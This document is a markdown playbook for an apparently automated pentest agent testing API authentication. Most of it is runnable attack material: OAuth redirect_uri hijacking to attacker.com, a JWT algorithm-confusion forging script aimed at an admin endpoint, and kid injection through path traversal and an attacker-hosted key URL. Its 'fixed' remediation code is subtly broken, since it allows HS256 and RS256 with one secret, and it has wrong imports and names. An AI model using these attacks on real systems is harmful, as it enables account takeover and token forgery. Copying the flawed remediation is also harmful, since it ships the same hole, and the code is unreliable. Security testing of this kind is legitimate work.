# Agent-003I: API Authentication Deep-Dive

## 🎯 Objectives

Comprehensive testing of API authentication mechanisms including OAuth 2.0, JWT, API Keys, MTLS:
- OAuth 2.0 token theft & refresh token abuse
- JWT algorithm confusion & kid parameter injection
- API Key leakage & rotation failures
- MTLS certificate pinning bypass
- Multi-factor authentication weaknesses
- Session token prediction

## 📋 Scope & Dependencies

**Depends On**:
- Agent-001 (Reconnaissance)
- Agent-003 (API Security overview)
- Agent-024 (OAuth/SAML/JWT)

**Tools Required**:
- `mitmproxy` / `burp-suite`
- `jwt.io` CLI
- `jq` (JSON query)
- `openssl`
- `hashcat`
- `john`
- Python: `pyjwt`, `requests`, `cryptography`
- Custom exploit scripts

## 🔍 Testing Techniques

### 1. OAuth 2.0 Attacks

#### Authorization Code Interception
```bash
# 1. Capture authorization code
# Monitor redirect URI for code parameter
code=$(curl -s "https://target.api/oauth/authorize?client_id=xxx&redirect_uri=https://attacker.com" | grep -o "code=[^&]*")

# 2. Exchange code for token
curl -X POST https://target.api/oauth/token \
  -d "grant_type=authorization_code&code=$code&client_id=xxx&client_secret=yyy"
```

#### Redirect URI Validation Bypass
```bash
# Test variations
https://target.api/oauth/authorize?redirect_uri=https://attacker.com
https://target.api/oauth/authorize?redirect_uri=https://target.api.attacker.com
https://target.api/oauth/authorize?redirect_uri=https://target.api.attacker.com/
https://target.api/oauth/authorize?redirect_uri=javascript:alert(1)
https://target.api/oauth/authorize?redirect_uri=//attacker.com
```

#### PKCE Bypass
```bash
# Test if PKCE is enforced
# 1. Authorization without PKCE
curl "https://target.api/oauth/authorize?client_id=xxx&response_type=code"

# 2. Token exchange without code_verifier
curl -X POST https://target.api/oauth/token \
  -d "grant_type=authorization_code&code=xxx&client_id=yyy"
```

### 2. JWT Attacks

#### Algorithm Confusion
```bash
# Original JWT header
# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9

# Change algorithm from RS256 to HS256
# Encode new header: {"alg":"HS256","typ":"JWT"}
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

# Sign with public key (since HS256 uses symmetric signing)
PAYLOAD=$(echo -n '{"sub":"admin","iat":1234567890}' | base64)
SECRET=$(curl https://target.api/.well-known/jwks.json | jq -r '.keys[0].n' | base64)
SIGNATURE=$(echo -n "header.payload" | openssl dgst -sha256 -mac HMAC -macopt key:$SECRET | base64)

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.$PAYLOAD.$SIGNATURE"
curl -H "Authorization: Bearer $TOKEN" https://target.api/admin
```

#### Kid Parameter Injection
```javascript
// Original JWT kid points to valid key
// Modify JWT to point to arbitrary file/URL

const jwt = require('jsonwebtoken');

const malicious = {
  header: {
    "alg": "HS256",
    "kid": "../../../etc/passwd"  // Directory traversal
  },
  payload: {
    "sub": "admin",
    "role": "administrator"
  }
};

// Or point to attacker-controlled URL
const malicious2 = {
  header: {
    "alg": "RS256",
    "kid": "https://attacker.com/key.pem"  // External key
  }
};
```

#### Token Expiration Bypass
```bash
# Check exp claim
jwt=$(echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTIzNDU2Nzg5MH0.xxxx")
echo "$jwt" | cut -d '.' -f 2 | base64 -d | jq '.exp'

# Modify expiration (3099999999 = year 2098)
# Reencode with new expiration
```

### 3. API Key Vulnerabilities

#### Key Leakage Detection
```bash
# Search for hardcoded keys in responses
curl -s https://target.api/user | grep -i "api.key\|api_key\|token\|secret"

# Check request/response for key exposure
curl -v https://target.api/user 2>&1 | grep -i "authorization\|x-api-key"
```

#### Key Rotation Failure
```bash
# Test if old keys continue to work
OLD_KEY="xxx"
NEW_KEY="yyy"

curl -H "X-API-Key: $OLD_KEY" https://target.api/users
# If still works: FINDING - Key rotation failure
```

### 4. MTLS & Certificate Pinning

#### Certificate Extraction
```bash
# Extract certificate from API endpoint
openssl s_client -connect target.api:443 -showcerts </dev/null 2>/dev/null | \
  openssl x509 -outform DER | openssl x509 -inform DER -text -noout
```

#### Pinning Bypass
```bash
# Test if pinning is enforced
# 1. With valid certificate: Works
# 2. With invalid certificate: Fails

# If both work: Pinning not enforced
curl --insecure https://target.api/users
```

## 📊 Expected Findings

### Critical Findings
1. **OAuth Token Theft via Redirect URI Bypass**
   - CVSS: 8.8 (Critical)
   - Attacker can hijack user sessions

2. **JWT Algorithm Confusion (HS256 vs RS256)**
   - CVSS: 8.5 (Critical)
   - Attacker can forge tokens

3. **PKCE Bypass in OAuth 2.0**
   - CVSS: 8.1 (High)
   - Authorization code can be stolen

### High Findings
4. **API Key Hardcoded in Responses**
   - CVSS: 7.8 (High)
   - Keys exposed in API responses

5. **Expired Tokens Still Accepted**
   - CVSS: 7.5 (High)
   - Expired sessions continue to work

6. **MTLS Certificate Pinning Not Enforced**
   - CVSS: 7.2 (High)
   - MITM attacks possible

### Medium Findings
7. **Key Rotation Not Enforced**
   - CVSS: 6.5 (Medium)
   - Old keys continue to work

## 🛡️ Remediation Code Examples

### Vulnerable Code (Node.js)
```javascript
// BAD: No token validation
const verify = (token) => {
  return jwt.verify(token, secret, { ignoreExpiration: true }); // ❌ Ignoring expiration!
};

// BAD: Accepting any algorithm
const verify = (token) => {
  return jwt.verify(token, secret); // ❌ No algorithm check
};

// BAD: Hardcoded API key
const API_KEY = "sk_live_xxx";
```

### Fixed Code
```javascript
// GOOD: Strict token validation
const verify = (token) => {
  try {
    return jwt.verify(token, secret, {
      algorithms: ['HS256'],        // ✅ Whitelist algorithms
      ignoreExpiration: false       // ✅ Always check expiration
    });
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      throw new Error('Token expired');
    }
    throw new Error('Invalid token');
  }
};

// GOOD: Validate kid parameter
const verify = (token) => {
  const decoded = jwt.decode(token, { complete: true });
  const kid = decoded.header.kid;
  
  // Validate kid against allowed values
  if (!ALLOWED_KIDS.includes(kid)) {
    throw new Error('Invalid kid parameter');
  }
  
  const key = getKeyByKid(kid);
  return jwt.verify(token, key, { algorithms: ['RS256'] });
};

// GOOD: API keys from environment
const API_KEY = process.env.API_KEY;
if (!API_KEY) throw new Error('API_KEY not configured');

// GOOD: MTLS with certificate pinning
const https = require('https');
const fs = require('fs');

const cert = fs.readFileSync('cert.pem');
const pinnedCerts = [crypto.createHash('sha256').update(cert).digest('hex')];

https.request(options, (res) => {
  const cert = res.socket.getPeerCertificate();
  const hash = crypto.createHash('sha256').update(cert.raw).digest('hex');
  
  if (!pinnedCerts.includes(hash)) {
    throw new Error('Certificate pinning validation failed');
  }
}).end();
```

### Python/FastAPI Example
```python
from fastapi import FastAPI, HTTPException, Depends
from fastapi.security import HTTPBearer, HTTPAuthCredentials
import jwt
from datetime import datetime, timedelta

app = FastAPI()
security = HTTPBearer()

SECRET_KEY = os.getenv("SECRET_KEY")
ALGORITHM = "HS256"
ALLOWED_ALGORITHMS = ["HS256", "RS256"]

def verify_token(credentials: HTTPAuthCredentials = Depends(security)):
    token = credentials.credentials
    try:
        # ✅ Specify allowed algorithms
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=ALLOWED_ALGORITHMS  # ✅ Whitelist only safe algorithms
        )
        # ✅ Expiration is checked automatically
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

@app.get("/api/users")
async def get_users(payload: dict = Depends(verify_token)):
    return {"users": [...]}
```

## ✅ Success Criteria

- [ ] All OAuth flows tested (auth code, implicit, client credentials)
- [ ] JWT algorithm confusion verified
- [ ] Token expiration enforced
- [ ] API keys properly rotated & not exposed
- [ ] MTLS certificate validation working
- [ ] MFA/second factors tested
- [ ] Clear evidence of vulnerabilities
- [ ] Remediation code provided

## 🔗 Related CVEs & References

- CVE-2016-10555: JWT algorithm confusion
- CVE-2021-21240: OAuth redirect URI bypass
- OWASP API1:2019 - Broken Object Level Authorization
- RFC 7519: JSON Web Token (JWT)
- RFC 6234: US Secure Hash and HMAC
